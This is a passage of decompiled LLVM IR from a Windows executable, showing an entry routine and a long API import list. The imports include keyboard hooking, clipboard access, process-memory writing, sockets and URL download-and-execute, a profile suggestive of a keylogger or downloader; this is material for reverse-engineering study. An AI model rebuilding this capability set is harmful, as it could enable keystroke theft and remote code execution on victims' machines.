  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2144
}

define i32 @function_407adb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407adb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2145
}

define i32 @SetFieldText.51() local_unnamed_addr {
dec_label_pc_407aff:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2146
  ret i32 %0, !insn.addr !2146
}

define i32 @function_407b04() local_unnamed_addr {
dec_label_pc_407b04:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2147
}

define i32 @function_407b06(i32 %arg1) local_unnamed_addr {
dec_label_pc_407b06:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2148
}

define i32 @entry_point() local_unnamed_addr {
dec_label_pc_407bf0:
  %esp.2.reg2mem = alloca i32, !insn.addr !2149
  %esp.1.reg2mem = alloca i32, !insn.addr !2149
  %esp.0.reg2mem = alloca i32, !insn.addr !2149
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-136 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %1 = call i32 @"@InitLib"(i32 %0), !insn.addr !2150
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !2151
  store i32 %2, i32* %stack_var_-116, align 4, !insn.addr !2151
  %3 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !2151
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !2152
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !2153
  %4 = call i32 @GetModuleFileNameA(i32* inttoptr (i32 260 to i32*), i8* bitcast (i8** @global_var_4096f0 to i8*), i32 0), !insn.addr !2154
  %5 = add i32 %4, ptrtoint (i8** @global_var_4096f0 to i32), !insn.addr !2155
  %6 = inttoptr i32 %5 to i8*, !insn.addr !2155
  store i8 0, i8* %6, align 1, !insn.addr !2155
  %7 = call i32 @"@LStrFromArray"(), !insn.addr !2156
  %8 = call i32 @function_4075e4(), !insn.addr !2157
  %9 = call i32 @"@LStrAsg"(), !insn.addr !2158
  %10 = call i32 @"@LStrAsg"(), !insn.addr !2159
  %11 = call i32 @"@LStrAsg"(), !insn.addr !2160
  %12 = call i32 @function_40765c(), !insn.addr !2161
  %13 = trunc i32 %12 to i8, !insn.addr !2162
  %14 = icmp eq i8 %13, 0, !insn.addr !2162
  br i1 %14, label %dec_label_pc_407d17, label %dec_label_pc_407c9c, !insn.addr !2163

dec_label_pc_407c9c:                              ; preds = %dec_label_pc_407bf0
  %15 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2164
  %16 = inttoptr i32 %15 to i32*, !insn.addr !2165
  store i32 -1, i32* %16, align 4, !insn.addr !2165
  %17 = call i32 @"@LStrFromArray"(), !insn.addr !2166
  %18 = call i32 @function_407624(), !insn.addr !2167
  %19 = call i32 @"@LStrAsg"(), !insn.addr !2168
  %20 = call i32 @"@LStrCat3"(), !insn.addr !2169
  %21 = call i32 @function_4036f4(), !insn.addr !2170
  %22 = inttoptr i32 %21 to i8*, !insn.addr !2171
  %23 = call i1 @DeleteFileA(i8* %22), !insn.addr !2172
  %24 = call i32 @"@LStrCat3"(), !insn.addr !2173
  %25 = call i32 @function_4036f4(), !insn.addr !2174
  %26 = inttoptr i32 %25 to i8*, !insn.addr !2175
  store i8* %26, i8** %stack_var_-136, align 4, !insn.addr !2175
  %27 = ptrtoint i8** %stack_var_-136 to i32, !insn.addr !2175
  %28 = call i32* @LoadLibraryA(i8* %26), !insn.addr !2176
  %29 = ptrtoint i32* %28 to i32, !insn.addr !2176
  store i32 %29, i32* @global_var_408118, align 4, !insn.addr !2177
  store i32 %27, i32* %esp.0.reg2mem, !insn.addr !2178
  br label %dec_label_pc_407d44, !insn.addr !2178

dec_label_pc_407d17:                              ; preds = %dec_label_pc_407bf0
  %30 = ptrtoint i32* %stack_var_-128 to i32, !insn.addr !2153
  %31 = call i32 @function_406648(), !insn.addr !2179
  %32 = call i32 @function_40765c(), !insn.addr !2180
  %33 = trunc i32 %32 to i8, !insn.addr !2181
  %34 = icmp eq i8 %33, 0, !insn.addr !2181
  store i32 %30, i32* %esp.2.reg2mem, !insn.addr !2182
  br i1 %34, label %dec_label_pc_407e86, label %dec_label_pc_407d39, !insn.addr !2182

dec_label_pc_407d39:                              ; preds = %dec_label_pc_407d17
  %35 = load i32, i32* @global_var_408138, align 4, !insn.addr !2183
  %36 = inttoptr i32 %35 to i32*, !insn.addr !2184
  store i32 -1, i32* %36, align 4, !insn.addr !2184
  store i32 %30, i32* %esp.0.reg2mem, !insn.addr !2184
  br label %dec_label_pc_407d44, !insn.addr !2184

dec_label_pc_407d44:                              ; preds = %dec_label_pc_407d39, %dec_label_pc_407c9c
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %37 = add i32 %esp.0.reload, -4, !insn.addr !2185
  %38 = inttoptr i32 %37 to i32*, !insn.addr !2185
  store i32 260, i32* %38, align 4, !insn.addr !2185
  %39 = add i32 %esp.0.reload, -8, !insn.addr !2186
  %40 = inttoptr i32 %39 to i32*, !insn.addr !2186
  store i32 ptrtoint (i8** @global_var_4096f0 to i32), i32* %40, align 4, !insn.addr !2186
  %41 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4, !insn.addr !2187
  %42 = ptrtoint i32 (i32, i32, i32)* %41 to i32, !insn.addr !2187
  %43 = add i32 %esp.0.reload, -12, !insn.addr !2188
  %44 = inttoptr i32 %43 to i32*, !insn.addr !2188
  store i32 %42, i32* %44, align 4, !insn.addr !2188
  %45 = call i32 @GetModuleFileNameA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !2189
  %46 = add i32 %45, ptrtoint (i8** @global_var_4096f0 to i32), !insn.addr !2190
  %47 = inttoptr i32 %46 to i8*, !insn.addr !2190
  store i8 0, i8* %47, align 1, !insn.addr !2190
  %48 = call i32 @"@LStrFromArray"(), !insn.addr !2191
  %49 = call i32 @function_407624(), !insn.addr !2192
  %50 = call i32 @"@LStrAsg"(), !insn.addr !2193
  %51 = call i32 @"@LStrCat3"(), !insn.addr !2194
  %52 = load i32, i32* @global_var_408138, align 4, !insn.addr !2195
  %53 = icmp eq i32 %52, 0, !insn.addr !2195
  br i1 %53, label %dec_label_pc_407ddd, label %dec_label_pc_407daa, !insn.addr !2196

dec_label_pc_407daa:                              ; preds = %dec_label_pc_407d44
  %54 = add i32 %esp.0.reload, -16, !insn.addr !2197
  %55 = inttoptr i32 %54 to i32*, !insn.addr !2197
  store i32 ptrtoint ([16 x i8]* @global_var_407f08 to i32), i32* %55, align 4, !insn.addr !2197
  %56 = add i32 %esp.0.reload, -20, !insn.addr !2198
  %57 = inttoptr i32 %56 to i32*, !insn.addr !2198
  store i32 ptrtoint ([8 x i8]* @global_var_407f18 to i32), i32* %57, align 4, !insn.addr !2198
  %58 = call i32* @FindWindowA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2199
  %59 = icmp eq i32* %58, null, !insn.addr !2200
  %60 = icmp eq i1 %59, false, !insn.addr !2201
  store i32 %56, i32* %esp.2.reg2mem, !insn.addr !2201
  br i1 %60, label %dec_label_pc_407e86, label %dec_label_pc_407dc1, !insn.addr !2201

dec_label_pc_407dc1:                              ; preds = %dec_label_pc_407daa
  %61 = add i32 %esp.0.reload, -24, !insn.addr !2202
  %62 = inttoptr i32 %61 to i32*, !insn.addr !2202
  store i32 ptrtoint (i32* @global_var_409810 to i32), i32* %62, align 4, !insn.addr !2202
  %63 = add i32 %esp.0.reload, -28, !insn.addr !2203
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2203
  store i32 0, i32* %64, align 4, !insn.addr !2203
  %65 = add i32 %esp.0.reload, -32, !insn.addr !2204
  %66 = inttoptr i32 %65 to i32*, !insn.addr !2204
  store i32 66, i32* %66, align 4, !insn.addr !2204
  %67 = add i32 %esp.0.reload, -36, !insn.addr !2205
  %68 = inttoptr i32 %67 to i32*, !insn.addr !2205
  store i32 4222148, i32* %68, align 4, !insn.addr !2205
  %69 = add i32 %esp.0.reload, -40, !insn.addr !2206
  %70 = inttoptr i32 %69 to i32*, !insn.addr !2206
  store i32 0, i32* %70, align 4, !insn.addr !2206
  %71 = add i32 %esp.0.reload, -44, !insn.addr !2207
  %72 = inttoptr i32 %71 to i32*, !insn.addr !2207
  store i32 0, i32* %72, align 4, !insn.addr !2207
  %73 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2208
  store i32 %71, i32* %esp.2.reg2mem, !insn.addr !2209
  br label %dec_label_pc_407e86, !insn.addr !2209

dec_label_pc_407ddd:                              ; preds = %dec_label_pc_407d44
  %74 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2210
  %75 = icmp eq i32 %74, 0, !insn.addr !2210
  store i32 %43, i32* %esp.2.reg2mem, !insn.addr !2211
  br i1 %75, label %dec_label_pc_407e86, label %dec_label_pc_407deb, !insn.addr !2211

dec_label_pc_407deb:                              ; preds = %dec_label_pc_407ddd
  %76 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !2212
  %77 = icmp eq i8 %76, 0, !insn.addr !2212
  br i1 %77, label %dec_label_pc_407dfa, label %dec_label_pc_407df5, !insn.addr !2213

dec_label_pc_407df5:                              ; preds = %dec_label_pc_407deb
  %78 = call i32 @function_406e84(), !insn.addr !2214
  br label %dec_label_pc_407dfa, !insn.addr !2214

dec_label_pc_407dfa:                              ; preds = %dec_label_pc_407df5, %dec_label_pc_407deb
  %79 = load i32, i32* @global_var_408148, align 4, !insn.addr !2215
  %80 = icmp slt i32 %79, 1, !insn.addr !2216
  br i1 %80, label %dec_label_pc_407e37, label %dec_label_pc_407e04, !insn.addr !2216

dec_label_pc_407e04:                              ; preds = %dec_label_pc_407dfa
  %81 = call i32 @function_405290(), !insn.addr !2217
  %82 = call i32 @"@LStrCmp"(), !insn.addr !2218
  %83 = load i32, i32* @global_var_408154, align 4, !insn.addr !2219
  %84 = inttoptr i32 %83 to i32*, !insn.addr !2220
  store i32 -1, i32* %84, align 4, !insn.addr !2220
  %85 = load i32, i32* @global_var_408154, align 4, !insn.addr !2221
  %86 = icmp eq i32 %85, 0, !insn.addr !2221
  br i1 %86, label %dec_label_pc_407e37, label %dec_label_pc_407e32, !insn.addr !2222

dec_label_pc_407e32:                              ; preds = %dec_label_pc_407e04
  %87 = call i32 @function_406564(), !insn.addr !2223
  br label %dec_label_pc_407e37, !insn.addr !2223

dec_label_pc_407e37:                              ; preds = %dec_label_pc_407e32, %dec_label_pc_407e04, %dec_label_pc_407dfa
  %88 = add i32 %esp.0.reload, -16, !insn.addr !2224
  %89 = inttoptr i32 %88 to i32*, !insn.addr !2224
  store i32 3, i32* %89, align 4, !insn.addr !2224
  %90 = add i32 %esp.0.reload, -20, !insn.addr !2225
  %91 = inttoptr i32 %90 to i32*, !insn.addr !2225
  store i32 16065, i32* %91, align 4, !insn.addr !2225
  %92 = load i32, i32* @global_var_408118, align 4, !insn.addr !2226
  %93 = add i32 %esp.0.reload, -24, !insn.addr !2227
  %94 = inttoptr i32 %93 to i32*, !insn.addr !2227
  store i32 %92, i32* %94, align 4, !insn.addr !2227
  %95 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2228
  %96 = icmp eq i32* %95, null, !insn.addr !2229
  %97 = icmp eq i1 %96, false, !insn.addr !2230
  store i32 %93, i32* %esp.1.reg2mem, !insn.addr !2230
  br i1 %97, label %dec_label_pc_407e77, label %dec_label_pc_407e4d, !insn.addr !2230

dec_label_pc_407e4d:                              ; preds = %dec_label_pc_407e37
  %98 = add i32 %esp.0.reload, -28, !insn.addr !2231
  %99 = inttoptr i32 %98 to i32*, !insn.addr !2231
  store i32 14, i32* %99, align 4, !insn.addr !2231
  %100 = add i32 %esp.0.reload, -32, !insn.addr !2232
  %101 = inttoptr i32 %100 to i32*, !insn.addr !2232
  store i32 16065, i32* %101, align 4, !insn.addr !2232
  %102 = load i32, i32* @global_var_408118, align 4, !insn.addr !2233
  %103 = add i32 %esp.0.reload, -36, !insn.addr !2234
  %104 = inttoptr i32 %103 to i32*, !insn.addr !2234
  store i32 %102, i32* %104, align 4, !insn.addr !2234
  %105 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2235
  %106 = icmp eq i32* %105, null, !insn.addr !2236
  %107 = icmp eq i1 %106, false, !insn.addr !2237
  store i32 %103, i32* %esp.1.reg2mem, !insn.addr !2237
  br i1 %107, label %dec_label_pc_407e77, label %dec_label_pc_407e63, !insn.addr !2237

dec_label_pc_407e63:                              ; preds = %dec_label_pc_407e4d
  %108 = add i32 %esp.0.reload, -40, !insn.addr !2238
  %109 = inttoptr i32 %108 to i32*, !insn.addr !2238
  store i32 16065, i32* %109, align 4, !insn.addr !2238
  %110 = load i32, i32* @global_var_408118, align 4, !insn.addr !2239
  %111 = add i32 %esp.0.reload, -44, !insn.addr !2240
  %112 = inttoptr i32 %111 to i32*, !insn.addr !2240
  store i32 %110, i32* %112, align 4, !insn.addr !2240
  %113 = call i32* @LoadIconA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !2241
  %114 = icmp eq i32* %113, null, !insn.addr !2242
  store i32 %111, i32* %esp.1.reg2mem, !insn.addr !2243
  store i32 %111, i32* %esp.2.reg2mem, !insn.addr !2243
  br i1 %114, label %dec_label_pc_407e86, label %dec_label_pc_407e77, !insn.addr !2243

dec_label_pc_407e77:                              ; preds = %dec_label_pc_407e63, %dec_label_pc_407e4d, %dec_label_pc_407e37
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %115 = call i32 @function_404e24(), !insn.addr !2244
  store i32 4225680, i32* @global_var_409654, align 4, !insn.addr !2245
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !2245
  br label %dec_label_pc_407e86, !insn.addr !2245

dec_label_pc_407e86:                              ; preds = %dec_label_pc_407e77, %dec_label_pc_407e63, %dec_label_pc_407ddd, %dec_label_pc_407dc1, %dec_label_pc_407daa, %dec_label_pc_407d17
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %116 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !2246
  %117 = load i32, i32* %116, align 4, !insn.addr !2246
  call void @__writefsdword(i32 0, i32 %117), !insn.addr !2247
  %118 = add i32 %esp.2.reload, 8, !insn.addr !2248
  %119 = inttoptr i32 %118 to i32*, !insn.addr !2248
  store i32 4226728, i32* %119, align 4, !insn.addr !2248
  %120 = call i32 @"@LStrArrayClr"(), !insn.addr !2249
  ret i32 %120, !insn.addr !2250
}

define i32 @function_407ea1() local_unnamed_addr {
dec_label_pc_407ea1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2251
  ret i32 %0, !insn.addr !2251
}

define i32 @function_407ea6() local_unnamed_addr {
dec_label_pc_407ea6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2252
}

declare void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @EnterCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare i1 @VirtualFree(i32*, i32, i32) local_unnamed_addr

declare i32* @VirtualAlloc(i32*, i32, i32, i32) local_unnamed_addr

declare i32* @LocalFree(i32*) local_unnamed_addr

declare i32* @LocalAlloc(i32, i32) local_unnamed_addr

declare i32 @GetTickCount() local_unnamed_addr

declare i1 @QueryPerformanceCounter(%_LARGE_INTEGER*) local_unnamed_addr

declare i32 @GetVersion() local_unnamed_addr

declare i32 @GetCurrentThreadId() local_unnamed_addr

declare i32 @GetThreadLocale() local_unnamed_addr

declare void @GetStartupInfoA(%_STARTUPINFOA*) local_unnamed_addr

declare i32 @GetLocaleInfoA(i32, i32, i8*, i32) local_unnamed_addr

declare i8* @GetCommandLineA() local_unnamed_addr

declare i1 @FreeLibrary(i32*) local_unnamed_addr

declare void @ExitProcess(i32) local_unnamed_addr

declare i1 @WriteFile(i32*, i32*, i32, i32*, %_OVERLAPPED*) local_unnamed_addr

declare i32 @UnhandledExceptionFilter(%_EXCEPTION_POINTERS*) local_unnamed_addr

declare void @RtlUnwind(i32*, i32*, %_EXCEPTION_RECORD*, i32*) local_unnamed_addr

declare void @RaiseException(i32, i32, i32, i32*) local_unnamed_addr

declare i32* @GetStdHandle(i32) local_unnamed_addr

declare i32 @GetKeyboardType(i32) local_unnamed_addr

declare i32 @MessageBoxA(i32*, i8*, i8*, i32) local_unnamed_addr

declare i32 @RegQueryValueExA(i32*, i8*, i32*, i32*, i8*, i32*) local_unnamed_addr

declare i32 @RegOpenKeyExA(i32*, i8*, i32, i32, i32**) local_unnamed_addr

declare i32 @RegCloseKey(i32*) local_unnamed_addr

declare void @SysFreeString(i16*) local_unnamed_addr

declare i32 @SysReAllocStringLen(i16**, i16*, i32) local_unnamed_addr

declare i1 @TlsSetValue(i32, i32*) local_unnamed_addr

declare i32* @TlsGetValue(i32) local_unnamed_addr

declare i1 @TlsFree(i32) local_unnamed_addr

declare i32 @TlsAlloc() local_unnamed_addr

declare i32 @LocalFree.2() local_unnamed_addr

declare i32 @LocalAlloc.3() local_unnamed_addr

declare i32 @RegSetValueExA(i32*, i8*, i32, i32, i8*, i32) local_unnamed_addr

declare i32 @RegQueryValueExA.4() local_unnamed_addr

declare i32 @RegOpenKeyExA.5() local_unnamed_addr

declare i32 @RegDeleteKeyA(i32*, i8*) local_unnamed_addr

declare i32 @RegCreateKeyExA(i32*, i8*, i32, i8*, i32, i32, %_SECURITY_ATTRIBUTES*, i32**, i32*) local_unnamed_addr

declare i32 @RegCloseKey.6() local_unnamed_addr

declare i8* @lstrcpyA(i8*, i8*) local_unnamed_addr

declare i32 @lstrcmpiA(i8*, i8*) local_unnamed_addr

declare i1 @WriteProcessMemory(i32*, i32*, i32*, i32, i32*) local_unnamed_addr

declare i32 @WriteFile.7() local_unnamed_addr

declare i1 @VirtualProtect(i32*, i32, i32, i32*) local_unnamed_addr

declare void @Sleep(i32) local_unnamed_addr

declare i1 @SetEndOfFile(i32*) local_unnamed_addr

declare i1 @ReadFile(i32*, i32*, i32, i32*, %_OVERLAPPED*) local_unnamed_addr

declare i32* @LoadLibraryA(i8*) local_unnamed_addr

declare i1 @GlobalUnlock(i32*) local_unnamed_addr

declare i32* @GlobalLock(i32*) local_unnamed_addr

declare i32* @GlobalFree(i32*) local_unnamed_addr

declare i32* @GlobalAlloc(i32, i32) local_unnamed_addr

declare i32 @GetTickCount.8() local_unnamed_addr

declare i32 @GetTempPathA(i32, i8*) local_unnamed_addr

declare i32 ()* @GetProcAddress(i32*, i8*) local_unnamed_addr

declare i32* @GetModuleHandleA(i8*) local_unnamed_addr

declare i32 @GetModuleFileNameA(i32*, i8*, i32) local_unnamed_addr

declare i32 @GetFileSize(i32*, i32*) local_unnamed_addr

declare i32* @GetCurrentProcess() local_unnamed_addr

declare void @FreeLibraryAndExitThread(i32*, i32) local_unnamed_addr

declare i32* @FindResourceA(i32*, i8*, i8*) local_unnamed_addr

declare i32 @ExitProcess.9() local_unnamed_addr

declare i1 @DeleteFileA(i8*) local_unnamed_addr

declare i32* @CreateThread(%_SECURITY_ATTRIBUTES*, i32, i32 (i32*)*, i32*, i32, i32*) local_unnamed_addr

declare i32* @CreateFileA(i8*, i32, i32, %_SECURITY_ATTRIBUTES*, i32, i32, i32*) local_unnamed_addr

declare i1 @CopyFileA(i8*, i8*, i1) local_unnamed_addr

declare i32 @CompareStringA(i32, i32, i8*, i32, i8*, i32) local_unnamed_addr

declare i1 @CloseHandle(i32*) local_unnamed_addr

declare i32* @SelectObject(i32*, i32*) local_unnamed_addr

declare i32* @GetStockObject(i32) local_unnamed_addr

declare i1 @GetCharWidthA(i32*, i32, i32, i32*) local_unnamed_addr

declare i32 @CreateWindowExA.10() local_unnamed_addr

declare i1 @UnhookWindowsHookEx(i32*) local_unnamed_addr

declare i32 @ToAscii(i32, i32, i8*, i16*, i32) local_unnamed_addr

declare i32* @SetWindowsHookExA(i32, i32 (i32, i32, i32)*, i32*, i32) local_unnamed_addr

declare i32 @SetWindowLongA(i32*, i32, i32) local_unnamed_addr

declare i32 @SetTimer(i32*, i32, i32, void (i32*, i32, i32, i32)*) local_unnamed_addr

declare i32 @SendMessageA(i32*, i32, i32, i32) local_unnamed_addr

declare i32 @ReleaseDC(i32*, i32*) local_unnamed_addr

declare void @PostQuitMessage(i32) local_unnamed_addr

declare i1 @PostMessageA(i32*, i32, i32, i32) local_unnamed_addr

declare i1 @OpenClipboard(i32*) local_unnamed_addr

declare i32* @LoadIconA(i32*, i8*) local_unnamed_addr

declare i1 @KillTimer(i32*, i32) local_unnamed_addr

declare i1 @IsWindowVisible(i32*) local_unnamed_addr

declare i1 @IsWindow(i32*) local_unnamed_addr

declare i32 @GetWindowThreadProcessId(i32*, i32*) local_unnamed_addr

declare i32 @GetWindowLongA(i32*, i32) local_unnamed_addr

declare i32* @GetTopWindow(i32*) local_unnamed_addr

declare i32* @GetParent(i32*) local_unnamed_addr

declare i32* @GetWindow(i32*, i32) local_unnamed_addr

declare i1 @GetMessageA(%tagMSG*, i32*, i32, i32) local_unnamed_addr

declare i1 @GetKeyboardState(i8*) local_unnamed_addr

declare i32* @GetDC(i32*) local_unnamed_addr

declare i32* @GetClipboardData(i32) local_unnamed_addr

declare i32 @GetClassNameA(i32*, i8*, i32) local_unnamed_addr

declare i32 @GetClassLongA(i32*, i32) local_unnamed_addr

declare i1 @GetCaretPos(%tagPOINT*) local_unnamed_addr

declare i32* @FindWindowExA(i32*, i32*, i8*, i8*) local_unnamed_addr

declare i32* @FindWindowA(i8*, i8*) local_unnamed_addr

declare i1 @EnumWindows(i1 (i32*, i32)*, i32) local_unnamed_addr

declare i32 @DispatchMessageA(%tagMSG*) local_unnamed_addr

declare i32 @DefWindowProcA(i32*, i32, i32, i32) local_unnamed_addr

declare i1 @CloseClipboard() local_unnamed_addr

declare i32 @CallNextHookEx(i32*, i32, i32, i32) local_unnamed_addr

declare i32 @WSACleanup() local_unnamed_addr

declare i32 @WSAStartup(i16, %WSAData*) local_unnamed_addr

declare i32 @gethostname(i8*, i32) local_unnamed_addr

declare %hostent* @gethostbyname(i8*) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @send(i32, i8*, i32, i32) local_unnamed_addr

declare i32 @recv(i32, i8*, i32, i32) local_unnamed_addr

declare i8* @inet_ntoa(%in_addr) local_unnamed_addr

declare i16 @htons(i16) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @closesocket(i32) local_unnamed_addr

declare i32* @ImageDirectoryEntryToData(i32*, i8, i16, i32*) local_unnamed_addr

declare i32* @ShellExecuteA(i32*, i8*, i8*, i8*, i8*, i32) local_unnamed_addr

declare i32 @URLDownloadToFileA(i32*, i8*, i8*, i32, i32*) local_unnamed_addr

declare i32 @URLDownloadToFileA.11() local_unnamed_addr

declare i1 @PathFileExistsA(i8*) local_unnamed_addr

; Function Attrs: nounwind readnone speculatable
declare i8 @llvm.ctpop.i8(i8) #0

declare i8 @__asm_in(i16) local_unnamed_addr

declare i32 @__asm_bound(i64) local_unnamed_addr

declare void @__asm_outsd(i16, i32) local_unnamed_addr

declare i8 @__asm_insb(i16) local_unnamed_addr

declare i32 @__asm_insd(i16) local_unnamed_addr

declare void @__asm_arpl(i16, i16) local_unnamed_addr

declare void @__asm_outsb(i16, i8) local_unnamed_addr

declare i32 @__asm_iretd() local_unnamed_addr

declare i32 @__asm_in.50(i16) local_unnamed_addr

declare i32 @__readfsdword(i32) local_unnamed_addr

declare void @__writefsdword(i32, i32) local_unnamed_addr

declare i8 @__readgsbyte(i32) local_unnamed_addr

declare void @__writegsbyte(i32, i8) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i1 @__decompiler_undefined_function_1() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_12() local_unnamed_addr

attributes #0 = { nounwind readnone speculatable }

!0 = !{i64 4198496}
!1 = !{i64 4198504}
!2 = !{i64 4198512}
!3 = !{i64 4198520}
!4 = !{i64 4198528}
!5 = !{i64 4198536}
!6 = !{i64 4198544}
!7 = !{i64 4198552}
!8 = !{i64 4198560}
!9 = !{i64 4198568}
!10 = !{i64 4198576}
!11 = !{i64 4198584}
!12 = !{i64 4198592}
!13 = !{i64 4198600}
!14 = !{i64 4198608}
!15 = !{i64 4198616}
!16 = !{i64 4198624}
!17 = !{i64 4198632}
!18 = !{i64 4198640}
!19 = !{i64 4198648}
!20 = !{i64 4198656}
!21 = !{i64 4198700}
!22 = !{i64 4198708}
!23 = !{i64 4198716}
!24 = !{i64 4198724}
!25 = !{i64 4198732}
!26 = !{i64 4198740}
!27 = !{i64 4198748}
!28 = !{i64 4198756}
!29 = !{i64 4200622}
!30 = !{i64 4200627}
!31 = !{i64 4200629}
!32 = !{i64 4200635}
!33 = !{i64 4202592}
!34 = !{i64 4202597}
!35 = !{i64 4202599}
!36 = !{i64 4202608}
!37 = !{i64 4203014}
!38 = !{i64 4203019}
!39 = !{i64 4203021}
!40 = !{i64 4203029}
!41 = !{i64 4203685}
!42 = !{i64 4203690}
!43 = !{i64 4203692}
!44 = !{i64 4203700}
!45 = !{i64 4203859}
!46 = !{i64 4203933}
!47 = !{i64 4203947}
!48 = !{i64 4204720}
!49 = !{i64 4205241}
!50 = !{i64 4205244}
!51 = !{i64 4205248}
!52 = !{i64 4205252}
!53 = !{i64 4205294}
!54 = !{i64 4205337}
!55 = !{i64 4205346}
!56 = !{i64 4205349}
!57 = !{i64 4205351}
!58 = !{i64 4205362}
!59 = !{i64 4205367}
!60 = !{i64 4205372}
!61 = !{i64 4205397}
!62 = !{i64 4206143}
!63 = !{i64 4206165}
!64 = !{i64 4206325}
!65 = !{i64 4206951}
!66 = !{i64 4207089}
!67 = !{i64 4207447}
!68 = !{i64 4207453}
!69 = !{i64 4207458}
!70 = !{i64 4207471}
!71 = !{i64 4207820}
!72 = !{i64 4207834}
!73 = !{i64 4207859}
!74 = !{i64 4207860}
!75 = !{i64 4207862}
!76 = !{i64 4207864}
!77 = !{i64 4207867}
!78 = !{i64 4208051}
!79 = !{i64 4208189}
!80 = !{i64 4208356}
!81 = !{i64 4208358}
!82 = !{i64 4208360}
!83 = !{i64 4208363}
!84 = !{i64 4208364}
!85 = !{i64 4208366}
!86 = !{i64 4208370}
!87 = !{i64 4208372}
!88 = !{i64 4208376}
!89 = !{i64 4208452}
!90 = !{i64 4208457}
!91 = !{i64 4208460}
!92 = !{i64 4208465}
!93 = !{i64 4208531}
!94 = !{i64 4208875}
!95 = !{i64 4209047}
!96 = !{i64 4209307}
!97 = !{i64 4209834}
!98 = !{i64 4209843}
!99 = !{i64 4209844}
!100 = !{i64 4209846}
!101 = !{i64 4209848}
!102 = !{i64 4209851}
!103 = !{i64 4209852}
!104 = !{i64 4209857}
!105 = !{i64 4209858}
!106 = !{i64 4209876}
!107 = !{i64 4209881}
!108 = !{i64 4209884}
!109 = !{i64 4209889}
!110 = !{i64 4210608}
!111 = !{i64 4210613}
!112 = !{i64 4210617}
!113 = !{i64 4210790}
!114 = !{i64 4210795}
!115 = !{i64 4210803}
!116 = !{i64 4210878}
!117 = !{i64 4210883}
!118 = !{i64 4210886}
!119 = !{i64 4211100}
!120 = !{i64 4211108}
!121 = !{i64 4211116}
!122 = !{i64 4211124}
!123 = !{i64 4211132}
!124 = !{i64 4211140}
!125 = !{i64 4211165}
!126 = !{i64 4211425}
!127 = !{i64 4211430}
!128 = !{i64 4211515}
!129 = !{i64 4211518}
!130 = !{i64 4211521}
!131 = !{i64 4211529}
!132 = !{i64 4211532}
!133 = !{i64 4211540}
!134 = !{i64 4211541}
!135 = !{i64 4211546}
!136 = !{i64 4211549}
!137 = !{i64 4211552}
!138 = !{i64 4211559}
!139 = !{i64 4211571}
!140 = !{i64 4211574}
!141 = !{i64 4211577}
!142 = !{i64 4211585}
!143 = !{i64 4211588}
!144 = !{i64 4211596}
!145 = !{i64 4211597}
!146 = !{i64 4211602}
!147 = !{i64 4211605}
!148 = !{i64 4211608}
!149 = !{i64 4211615}
!150 = !{i64 4211616}
!151 = !{i64 4211624}
!152 = !{i64 4211632}
!153 = !{i64 4211640}
!154 = !{i64 4211648}
!155 = !{i64 4211656}
!156 = !{i64 4211664}
!157 = !{i64 4211672}
!158 = !{i64 4211680}
!159 = !{i64 4211688}
!160 = !{i64 4211696}
!161 = !{i64 4211704}
!162 = !{i64 4211712}
!163 = !{i64 4211720}
!164 = !{i64 4211728}
!165 = !{i64 4211736}
!166 = !{i64 4211744}
!167 = !{i64 4211752}
!168 = !{i64 4211760}
!169 = !{i64 4211768}
!170 = !{i64 4211776}
!171 = !{i64 4211784}
!172 = !{i64 4211792}
!173 = !{i64 4211800}
!174 = !{i64 4211808}
!175 = !{i64 4211816}
!176 = !{i64 4211824}
!177 = !{i64 4211832}
!178 = !{i64 4211840}
